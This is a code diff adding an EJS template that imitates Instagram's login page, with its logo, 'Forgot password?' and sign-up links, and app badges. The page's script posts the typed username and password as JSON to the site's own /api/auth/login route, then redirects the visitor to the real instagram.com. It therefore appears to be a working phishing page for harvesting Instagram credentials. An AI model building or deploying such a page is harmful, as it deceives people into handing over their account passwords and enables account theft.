@@ -1,28 +1,173 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link href="//netdna.bootstrapcdn.com/font-awesome/3.2.1/css/font-awesome.css" rel="stylesheet">
+  <link rel="icon" type="image/x-icon" href="/images/favicon.ico">
+  <link rel="stylesheet" href="/styles/main.css">
+  <!-- <script src="/js/main.js"></script> -->
+  <title><%= pageTitle %></title>
 </head>
+
 <body>
-    <div>
-        <section>
-            <main>
-                <article>
-                    <div class="right-side">
-                        
-                    </div>
-                    <div class="left-side">
+  <header>
+  </header>
+  <section class="section-container">
+    <main>
+      <article class="article-container">
+        <div class="left-side">
+          <div>
+            <img src="/images/animation.gif" alt="">
+          </div>
+        </div>
+        <div class="right-side">
+          <div id="border">
+            <div class="logo">
+              <img src="/images/logo.png" alt="logo">
+            </div>
+            <div class="form-container">
+              <!-- you can also do like this -->
+              <!-- <form action="/api/auth/login" method="POST"> -->
+              <form>
+                <div class="form-inputs">
+                  <div class="inputField">
+                    <input type="text" id="username" name="Username" minlength="1" required>
+                    <span class="floating-placeholder">Phone number, username or email</span>
+                  </div>
+                  <div class="inputField">
+                    <input type="password" id="password" name="Password" minlength="1" required>
+                    <span class="floating-placeholder">Password</span>
+                    <span id="togglePassword">show</span>
+                  </div>
+                  <!-- if you use api directly you shoud write like this -->
+                  <!-- <button id="loginButton" type="submit" disabled> -->
+                  <button id="loginButton" type="button" onclick="postLogin()" disabled>
+                    Log in
+                  </button>
 
-                    </div>
-                </article>
-            </main>
-            <footer>
-
-            </footer>
-        </section>
-    </div>
+                </div>
+                <a href="https://www.instagram.com/accounts/password/reset/">Fogot password?</a>
+              </form>
+            </div>
+          </div>
+          <div id="border">
+            <div class="sign-up">
+              <p>
+                Don't have an account?
+                <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a>
+              </p>
+            </div>
+          </div>
+          <div class="get-app">
+            <p>Get the app.</p>
+            <div class="get-app-img">
+              <a target="_blank" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.badge&mt=8&vt=lo">
+                <img src="/images/app-store.png" alt="appstore" style="height: 40px;">
+              </a>
+              <a target="_blank" href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DA1A8C1F5-313B-4198-9CB0-F5CBC4746312%26utm_content%3Dlo%26utm_medium%3Dbadge">
+                <img src="/images/google-play.png" alt="googleplay" style="height: 40px;">
+              </a>
+            </div>
+          </div>
+        </div>
+      </article>
+    </main>
+    <%- include('../includes/footer.ejs') %>
+  </section>
 </body>
+<script>
+  const username = document.getElementById("username");
+  const password = document.getElementById("password");
+  const loginButton = document.getElementById("loginButton");
+  const togglePassword = document.getElementById("togglePassword");
+
+  togglePassword.addEventListener("click", function() {
+    // toggle the type attribute
+    const type = password.getAttribute("type") === "password" ? "text" : "password";
+    password.setAttribute("type", type);
+
+    // toggle the span textContent
+    if (togglePassword.textContent.match("show")) {
+      togglePassword.textContent = "hide";
+    } else {
+      togglePassword.textContent = "show";
+    }
+    // togglePassword.textContent === "show" ? "hide" : "show"
+  });
+
+  password.addEventListener("keyup", (event) => {
+    if (password.value.length > 0) {
+      togglePassword.style.display = "block";
+    } else {
+      togglePassword.style.display = "none";
+    }
+  });
+
+  document.addEventListener("keyup", (event) => {
+    isValidUsername = username.checkValidity();
+    isValidPassword = password.value.length > 5 ? true : false
+
+    // console.log(username.value, password.value);
+
+    if (isValidUsername & isValidPassword) {
+      document.getElementById("loginButton").disabled = false;
+    } else {
+      document.getElementById("loginButton").disabled = true;
+    }
+  });
+
+  // Using New Feature Fetch API .... ;))
+  function postLogin() {
+    const data = {
+      Username: username.value,
+      Password: password.value
+    }
+
+    fetch('/api/auth/login', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      })
+      .then((response) => response.json())
+
+      .then((data) => {
+        if (data.Success) {
+          window.location.href = "https://www.instagram.com/"
+        } else {
+          alert('Error mesage: ' + data.Message);
+        }
+      })
+
+      .catch((error) => {
+        console.error('Error:', error);
+      });
+  }
+
+  /* Using Ajax , xmlhttprequest. ( demode :// )
+  function postLogin() {
+    const url = "/api/auth/login";
+    const xhr = new XMLHttpRequest();
+    const data = {
+      Username: username.value,
+      Password: password.value
+    }
+
+    xhr.open("POST", url, true);
+    xhr.onreadystatechange = (oEvent) => {
+      if (xhr.readyState == 4 && this.status == 200) {
+        window.location.href = "https://www.instagram.com/";
+      } else {
+        alert('Error mesage: ' + (JSON.parse(xhr.responseText).Message));
+      }
+    }
+    xhr.setRequestHeader("Content-type", "application/json; charset=UTF-8");
+    xhr.send(JSON.stringify(data));
+  }*/
+</script>
+
 </html>
